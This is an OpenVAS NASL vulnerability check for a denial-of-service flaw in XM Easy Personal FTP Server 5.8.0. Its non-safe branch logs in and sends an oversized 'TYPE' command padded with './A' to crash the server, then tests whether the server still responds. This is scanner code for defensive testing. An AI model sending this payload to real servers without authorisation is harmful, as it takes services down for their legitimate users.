###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xm_eaasy_ftp_46314.nasl 12014 2018-10-22 10:01:47Z mmartin $
#
# XM Easy Personal FTP Server 'TYPE' Command Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################


if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103072");
  script_version("$Revision: 12014 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 12:01:47 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-02-11 13:54:50 +0100 (Fri, 11 Feb 2011)");
  script_bugtraq_id(46314);
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");
  script_name("XM Easy Personal FTP Server 'TYPE' Command Remote Denial of Service Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/46314");
  script_xref(name:"URL", value:"http://www.dxm2008.com/data/ftpserversetup.exe");

  script_tag(name:"qod_type", value:"remote_banner");
  script_category(ACT_MIXED_ATTACK);
  script_family("FTP");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "secpod_ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name:"summary", value:"XM Easy Personal FTP Server is prone to a remote denial-of-service
vulnerability.

This issue allows remote attackers to crash affected FTP servers,
denying service to legitimate users.

XM Easy Personal FTP Server 5.8.0 is vulnerable. Other versions may
also be affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("ftp_func.inc");
include("version_func.inc");

port = get_kb_item("Services/ftp");
if(!port){
  port = 21;
}

if(get_kb_item('ftp/'+port+'/broken'))exit(0);

if(!get_port_state(port)){
  exit(0);
}

if(safe_checks()) {

 if( ! banner = get_ftp_banner(port:port)) exit(0);
 if(egrep(pattern: "Welcome to DXM's FTP Server", string:banner)) {

   version = eregmatch(pattern: "Welcome to DXM's FTP Server ([0-9.]+)", string: banner);

   if( ! isnull(version[1])) {
     if(version_is_equal(version: version[1], test_version: "5.8.0")) {
       security_message(port:port);
       exit(0);
     }
   }
 }

} else {

  soc1 = open_sock_tcp(port);
  if(!soc1){
    exit(0);
  }
  domain = get_kb_item("Settings/third_party_domain");
  if(isnull(domain)) {
   domain = this_host_name();;
  }

  user = get_kb_item("ftp/login");
  pass = get_kb_item("ftp/password");

  if(!user)user = "anonymous";
  if(!pass)pass = string("openvas@", domain);;

  login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
  if(login_details)
  {
    ftpPort2 = ftp_get_pasv_port(socket:soc1);
    if(ftpPort2)
    {
      soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(port));
      if(soc2)
      {
        bo_data = string("TYPE ", crap(length: 18900, data:"./A"));
        send(socket:soc1, data:bo_data);
        close(soc2);
        close(soc1);

        sleep(2);

        soc3 = open_sock_tcp(port);

        if( ! ftp_recv_line(socket:soc3) )
        {
          security_message(port:port);
    	  close(soc3);
          exit(0);
        }
      }
    }
  }
}
exit(0);
